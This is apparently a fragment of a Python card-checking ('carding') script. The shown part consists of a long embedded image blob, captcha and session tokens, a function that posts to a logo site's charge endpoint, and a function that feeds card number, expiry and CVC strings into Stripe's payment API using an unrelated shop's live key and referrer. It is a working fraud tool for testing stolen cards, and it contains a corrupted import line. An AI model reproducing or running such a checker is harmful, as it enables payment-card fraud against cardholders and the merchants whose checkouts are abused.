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" id="icon" x="414" y="0" width="195" height="195" transform="translate(0 136.88306625) "></image>\n    </g>\n  </g>\n</svg>\n',
	    'recaptcha_token': '03AFcWeA434C5mUeuj7oXRlBipQml2uVelaYsvXtdl9NQFtzZw8pCYsANWl1Zze5jPjYKfL3q_8BZbGOS6t19b68DlcXZTAIDSeRovYek5J9SFkWg4m8aASRklQSPa__vJ7oCHSpPprmte3qZT8S_7LKBTEvNQ6XXpkC0joyppbcsaSK5abjxvA7vTu9HE4yOewiVUctvHiOOEvjsH3Iyf--W4FDxhZMdWx5KSaSqEGflcRZ-nmVBmOkosSEqaczqadIbyUxLaH2c3YY-iwdmST6eEDWcgTybIeazEvj6DCH9iBohrF7NBkEDNSa3_Dz3XWSkbxtS1Mo3u-MlF5yrnTuu6DYRByStff7AQHPR9BlCpntPckBQG4JoK0MJHCZdTnZHo4dBEU-Ya_1s-RmetlIGWItzQiEE8YKZo8vufxVpb1Oqv7q2AASWJxjnyb6dQTfIUvBXBRb2NNSbbNraKLB1Ce1sIgwMvIh0ajKPJkzcak419uot0-RWrN_nB_zgfEmFl-9e83flOBNdDFrYweTJHOlEMqA9ebFMkDOGG4KnVvr2cS9vd179PgvMWtS_j5e60ImowAaCKE-fBSwYpvrHfl10ApD-EY-g72ZZDY2gioopKycucTnwKOLAT6KA0ze4FAEsamdZyXQxvvPJBtAAyhPIJPrjUmWsIMwl851ePL2ivDdzkUv-Qh2BzjUNPxV6WzUBwdSSRSgOeKsDIgDZbtCTfYxyuvijP8W1Diae2NAbnY0GfO0XIV-253b04rKB3eTk-eN4DC87ugBr5hb4Cbl2PPwDbVbWmZdYzxPjAshE_MreJQLD1pF3Dr5dKQE6D7fVxEpcwfvfnw1WPYiFa-roB918La7lYHe2RBDGlAXX6T3A6O1VcK5pGZt21b2V339-fxjoFrd9UoduS_7BFfck0C69YJiZS2k6TAE7GLWWoc1SBkK8hhyk3WtUmBMpZYx_895iuGTI76x-6Sy9LZUi_CyCR-pIdN7dIGouPN2AVwbu-r3FOnCZYc7UUIwgwJ8Q9LGq3tgtERekRQERZGy6eX_A6z0TIZWQ6k2b_CUJNoOXEhfHbauruEAN358K6rwNM27BKpSP7SZM4k2ID4pG9XB7NmRnuV6XlalEsuIu4vNWgeQCWe8BXQJT1gGsxLq845uMUaT_BIb4nQFyIpWYrXzr9Gqx2Hn01Qp8e9oBdiPH7oJAciL-Ekq6nrmQuy9s05oeOBTfr04wb9ny3xLURdsQTkmHJspO-viIPKE-SoOOhD9eSxU85N-we5X0dCgMlJDU2-7-zNcQ005a8ETvA4ekdvYkvgKoKz1nX9fZktYiqXAOsZOdEgLz9Sc19pEM8Ihbeh2HPV_XqsN_wzmLjKbfzuP8XyZzFpmjFPXOG0JL-qZw3f2bgns1nb3sqm-90xe04ZY00UlY38c0a6YfzlpotCicXj4OM9WIwqDr9kw4bxNx5FHQd85I6WcpdhB7eN6yMwDlbDCH02zDWsasHb2W-Mx2t7Otq3X-gyzC2OJGLd7Lfgkm7rpfLqs-im-7IfDefU2dKS4yX_ZO_f4-s9g42dz9FErD2mRWE07WERw3N1L-8TUPUWzWlGna2IAC4djCjEa3vrvzwtKikyIkllyfbsH30fmLelI2j-eubTZydkOqw5yX9aEu0BHxsPb4Xgeg4hU0PVNxvCWue11w10nQeNlAzi1htyvwoBf2xlagl7U1NjsTZel5Ln6hdEuncqf2LnCv2Xu10WHgr2u2dPe8-ZQ',
	    'token': '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',
	}
	
	response = requests.post('https://app.brandmark.io/v3/charge.php', cookies=cookies, headers=headers, json=json_data)
	ug=(response.json()['status'])
	msg=(response.json()['message'])
	if ug=='success':
		return ug
	else:
		return msg
def sff(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]

	import requestsخ

	headers = {
        'accept': 'application/json',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }

	data = f'type=card&billing_details[name]=+&billing_details[email]=adfeaqfa%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=78502b00-c105-497b-a387-9c3a944bf38c9a78ff&muid=59216b65-f71c-4b7b-8ad7-285889bdd449240699&sid=450c5cfd-885e-4a38-be95-4cbcd6f0982b778132&payment_user_agent=stripe.js%2F455defd472%3B+stripe-js-v3%2F455defd472%3B+split-card-element&referrer=https%3A%2F%2Fwww.fashionchingu.com&time_on_page=397704&key=pk_live_51HPOYUGcZoU9AJNR2UZ2nDPJrX0lslOjSGi7LlUYj2XRThIiEHciyaefRNrRyiyI7cAtwIufQOr5ddKw9awYWItR00eG80CVzA&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiYlgyU0RwdWxVZVVFOUNJUG9RQTJkWU1sQ2ZzM0pyWlVmaEpNNWhQdTJleUtFVEZqTTRlTGxlcG5vQjU2KzNoMGtjcUJGZkxwYjdCVXpMZTdCcXFnOHF3eXZLY1FBQ3o3OGdtOHFmMmFReXA4aWduOEpVRnErSkFzbVdCR1Z1Ym5JbXFvRTdYQzVxVklsSUJKblF1dmxyMmlLTzVKb0RlSlZBZ3lnNkxLdnJSbTFlRnlGN0d1eEl6SzBEWkRPdFdweUQ4L2JYcnZzazNuR0xSb1pySGR4QzVtd0hsY2NFeXVMcEltbEFmOXk0QzBlRVhKNVhMVTd3eG9lM09OQjVsV3RWcHpqakYybzU3c25PZFdlZ0kvaExEeGhjT3FUYnptQTlCYWluQlRTVGhWTDVKRTRpckNuVTZiby9MOEdEcWFqWi9ZbVpSTG13V2NwNGFnaCtZZkR1a1JQV1MxUFBHekYyODUzcnFFcGVOQjVLeWExN3d3NW9XTlhCN09SUVV